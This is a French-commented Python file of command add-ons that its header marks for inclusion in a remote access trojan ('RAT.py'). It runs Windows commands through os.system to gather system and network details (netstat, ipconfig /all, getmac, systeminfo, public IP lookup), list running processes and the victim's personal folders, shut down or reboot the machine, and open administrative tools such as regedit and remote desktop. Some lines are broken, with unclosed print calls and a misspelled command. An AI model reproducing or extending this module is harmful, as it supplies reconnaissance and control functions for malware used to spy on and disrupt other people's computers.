##########					     ##########
########## COMMANDS.py ADDONS    ##########
##########						 ##########

## VOIR L'OS DE LA MACHINE [INCLUDE TO RAT.py] ##

# Importations necessaires

import platform

# Renvoyer le type du système d'exploitation

osType = platform.system()
print("OS TYPE: " + osType)

# Renvoyer la version du système d'exploitation.

osRelease = platform.release()
print("\nversion: " + osRelease)

## VOIR TOUT LES PORTS ACTIFS ##

# os.system(“commande utilisé pour éxécuté un paramètre")

import os

print("Tout les ports actifs: ")
os.system("netstat -aon")

## VOIR LES CONNEXIONS ENTRANTES/SORTANTES ##

import os

print("Liste des connexions entrantes/sortantes :")
os.system("netstat -n")

## VOIR INFORMATION RESEAU SIMPLE DE LA MACHINE ##

import os

print("Information réseau simplifié")
os.system("ipconfig")

## VOIR INFORMATION IP PUBLIC DE LA MACHINE ##

import os
print("Voir IP public de la machine")
os.system("nslookup myip.opendns.com. resolver1.opendns.com")

## VOIR TOUTE LES INFORMATIONS RESEAU DE LA MACHINE ##

import os

print("Informations reseaux détaillés")
os.system("ipconfig /all")

## VOIR TOUTE LES @MAC DE TOUTE LES CARTES RESEAUX DE LA MACHINE ##

import os

print("Addrese mac des cartes réseaux")
os.system("getmac /v")

## VOIR LES INFORMATIONS DE LA MACHINE ##

import os

print("Toute les informations de la machine"
os.system("systeminfo")

## ETEINDRE LA MACHINE ##

import os

print("Eteindre la machine")
os.system("shutdown")

## REDEMARRER LA MACHINE ##

import os

print("Redémarrer la machine")
os.system("shutdown -r")

## MONTRER LE REPERTOIRE BUREAU ##

import os

print("Accéder au bureau")
os.system("dir desktop")

## MONTRER LE REPERTOIRE DOCUMENT ##

import os

print("Accéder aux documents")
os.system("dir documents")

## MONTRER LE REPERTOIRE IMAGES ##

import os

print("Accéder aux images")
os.system("dir pictures")

## MONTRER LE REPERTOIRE TELECHARGEMENT ##

import os

print("Accéder aux téléchargements")
os.system("dir downloads")

## MONTRER LES FICHIERS RECENTS ##

import os

print("Accéder au bureau")
os.system("dir recent")

## AFFICHIER TOUT LES PROCESSUS/SERVICES DE LA MACHINE ##

import os

print("Toutes les applications et services en cours")
os.system("tasklist")

## AFFICHER LE GESTIONNAIRE DES DISQUES - ! GRAPHIQUE UNIQUEMENT ! ##

import os

print("Afficher le gestionnaire des disques de la machine")
os.system("diskmgmt.dsc")

## AFFICHER LE GESTIONNAIRE DE PARTION DES DISQUES - ! GRAPHIQUE UNIQUEMENT ! ##

import os

print("Afficher le gestionnaire de partition des disques")
os.system("diskpart")

## AFFICHER LE DEGRAMENTEUR DES DISQUES - ! GRAPHIQUE UNIQUEMENT ! ##

import os

print("Afficher le deframenteur de disque")
os.system("dfrg.msc")

## AFFICHER LES PERIPHERIQUES RESEAUX DE LA MACHINE - ! GRAPHIQUE UNIQUEMENT ! ##

import os

print("Afficher les périphériques réseaux")
os.system("ncpa.cpl")

## AFFICHER LA CONNEXION BUREAU A DISTANCE - ! GRAPHIQUE UNIQUEMENT ! ##

import os

print("Afficher connexion bureau a distance")
os.system("mstsc.exe")

## SUPPRIMER DES PROGRAMMES - ! GRAPHIQUE UNIQUEMENT ! ##

import os

print("Affichier la suppresion des programmes")
os.system("appwiz.cpl")

## GESTION DE L'ORDINATEUR - ! GRAPHIQUE UNIQUEMENT ! ##

import os

print("Afficher le gestionnaire de l'ordinateur")
os.system("compmgmt.msc")

## GESTIONNAIRE DES PERIPHERIQUES - ! GRAPHIQUE UNIQUEMENT ! ##

import os

print("Gestionnaire des périphériques")
os.system("devmgmt.msc")

## OBSERVATEUR DES EVENEMENTS DE LA MACHINE - ! GRAPHIQUE UNIQUEMENT ! ##

import os

print("Observateur des evenements")
os.system("eventvwr.msc")

## AFFICHER LE GESTIONNAIRE DES TACHES - ! GRAPHIQUE UNIQUEMENT ! ##

import os

print("Afficher le gestionnaire des taches - CTRL + ALT + SUPPR")
os.system("taskmgr")

## CONFIGURATIONS DES SESSIONS UTILISATEURS - ! GRAPHIQUE UNIQUEMENT ! ##

import os

print("Configurations des sessions de la machine"
os.system("netplwiz")

## AFFICHER LE REGISTRE DE LA MACHINE - ! GRAPHIQUE UNIQUEMENT ! ##

import os

print("Afficher le registre de la machine")
os.system("regedit")

## AFFICHER LES OPTIONS DE DEMARRAGES - ! GRAPHIQUE UNIQUEMENT ! ##

import os

print("Afficher les options de démarrages")
os.system("msconfig")

## AFFICHER L'INVITE DE COMMANDE - ! GRAPHIQUE UNIQUEMENT ! ##

import os

print("Afficher l'invite de commande")
os.system("cmd")

## AFFICHER LE BLOC NOTE - ! GRAPHIQUE UNIQUEMENT ! ##

import os

print("Afficher le bloc note")
os.system("notepad")

## AFFICHE L'HEURE DE LA MACHINE ##

import os

print("Afficher l'heure du system")
os.system("time")
